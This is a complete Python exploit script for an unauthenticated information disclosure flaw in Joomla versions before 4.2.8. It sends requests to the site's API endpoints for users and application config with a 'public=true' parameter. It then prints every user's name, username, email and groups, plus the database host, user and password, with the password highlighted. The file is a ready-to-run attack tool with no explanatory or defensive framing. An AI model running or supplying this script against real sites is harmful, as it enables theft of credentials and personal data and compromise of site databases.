#!/usr/bin/env python3

import requests
import argparse
import json
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

def fetch_data(url, endpoint):
    """
    Fetch data from the specified URL and endpoint.
    """
    full_url = f"{url}/api/index.php/v1/{endpoint}?public=true"
    response = requests.get(full_url)
    return response.json()

def parse_users(data):
    """
    Parse user data from the fetched JSON.
    """
    users = []
    for user in data['data']:
        if user['type'] == 'users':
            users.append({
                'id': user['attributes']['id'],
                'name': user['attributes']['name'],
                'username': user['attributes']['username'],
                'email': user['attributes']['email'],
                'groups': user['attributes']['group_names'],
            })
    return users

def display_users(users):
    """
    Display parsed user information.
    """
    print(Fore.RED + Style.BRIGHT + 'Users')
    for user in users:
        user_info = f"[{user['id']}] {user['name']} ({Fore.YELLOW}{user['username']}{Fore.RESET}) - {user['email']} - {user['groups']}"
        print(user_info)

def parse_config(data):
    """
    Parse configuration data from the fetched JSON.
    """
    config = {}
    for entry in data['data']:
        if entry['type'] == 'application':
            key = next(iter(entry['attributes']))
            config[key] = entry['attributes'][key]
    return config

def display_config(config):
    """
    Display parsed configuration information.
    """
    print(Fore.RED + Style.BRIGHT + 'Site info')
    for key, value in config.items():
        if key in ['sitename', 'editor', 'captcha', 'access', 'debug']:
            # Ensure the value is converted to a string for safe concatenation
            print(f"{key.capitalize()}: {str(value)}")

    print(Fore.RED + Style.BRIGHT + '\nDatabase info')
    # List of database-specific keys to check for in the config
    db_keys = ['dbtype', 'host', 'user', 'password', 'db', 'dbprefix', 'dbencryption']
    for key in db_keys:
        if key in config:
            # Convert the value to string and ensure it's safely concatenated for output
            value_str = str(config[key])
            # Check for sensitive information like passwords to handle output accordingly
            if key in ['password']:
                value_str = Fore.YELLOW + Style.BRIGHT + value_str + Style.RESET_ALL
            print(f"{key.capitalize()}: {value_str}")


def main():
    parser = argparse.ArgumentParser(description='Joomla! < 4.2.8 - Unauthenticated information disclosure exploit')
    parser.add_argument('url', help='Root URL (base path) including HTTP scheme, port and root folder')
    parser.add_argument('--debug', action='store_true', help='Display arguments')
    parser.add_argument('--no-color', action='store_true', help='Disable colorized output')

    args = parser.parse_args()

    if args.no_color:
        global Fore, Style
        Fore = Style = type('', (), {'__getattr__': lambda *args: ''})()

    if args.debug:
        print(args)

    users_data = fetch_data(args.url, 'users')
    users = parse_users(users_data)
    display_users(users)

    config_data = fetch_data(args.url, 'config/application')
    config = parse_config(config_data)
    display_config(config)

if __name__ == "__main__":
    main()
